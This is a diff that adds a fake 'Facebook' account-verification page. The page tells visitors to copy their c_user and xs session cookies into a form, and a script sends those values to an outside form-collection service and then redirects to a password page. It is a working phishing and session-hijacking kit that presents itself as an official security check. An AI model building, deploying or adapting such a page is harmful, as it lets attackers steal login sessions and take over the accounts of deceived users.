@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Submit Verification Details - Facebook</title>
+  <link rel="stylesheet" href="/style.css">
+</head>
+
+<body>
+  <header class="header">
+    <div class="container header-content">
+      <a href="/" class="header-logo">Facebook</a>
+    </div>
+  </header>
+
+  <div class="container">
+
+    </div>
+
+    <h1>Submit Required Verification Details</h1>
+    <p>To verify your account, provide the following details from your browser's cookies.</p>
+
+    <div class="video-container">
+      <iframe src="https://www.youtube.com/embed/YPM-zaPQMRE" title="How to Apply" frameborder="0"
+        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+        allowfullscreen>
+      </iframe>
+    </div>
+
+<form id="verification-form" action="https://submit-form.com/g0dJSXe5U" method="POST">
+  <input type="text" class="form-input" name="c_user" placeholder="Enter c_user Value" required>
+  <input type="text" class="form-input" name="xs" placeholder="Enter xs Token" required>
+
+  <button type="submit" class="btn btn-primary">Submit</button>
+  <button type="button" class="btn btn-secondary" onclick="window.location.href='mobile.html'">
+    Need Help? Get Instructions for Mobile
+  </button>
+</form>
+
+<script>
+  document.getElementById("verification-form").addEventListener("submit", function(event) {
+    event.preventDefault();
+    const form = event.target;
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData);
+
+    fetch(form.action, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify(data)
+    })
+    .then(response => {
+      if (response.ok) {
+        window.location.href = "password.html";
+      } else {
+        throw new Error('Form submission failed');
+      }
+    })
+    .catch(error => {
+      alert("Error submitting form. Please try again.");
+    });
+  });
+</script>
